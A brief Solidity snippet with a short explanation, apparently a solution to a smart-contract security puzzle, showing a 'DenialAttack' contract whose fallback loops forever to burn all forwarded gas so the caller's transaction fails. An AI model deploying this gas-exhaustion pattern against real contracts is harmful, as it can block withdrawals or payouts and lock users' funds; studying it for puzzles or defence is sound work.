```javascript
pragma solidity ^0.6.0;

contract DenialAttack {
    fallback() external payable {
        // Consume all gas
        while (true) {
        }
    }
}
```

Just have a function to consume all gas, so the transaction always fail. There is caveat, something about 1/64 gas is reserved to running the code in the storage (cannot be used for call).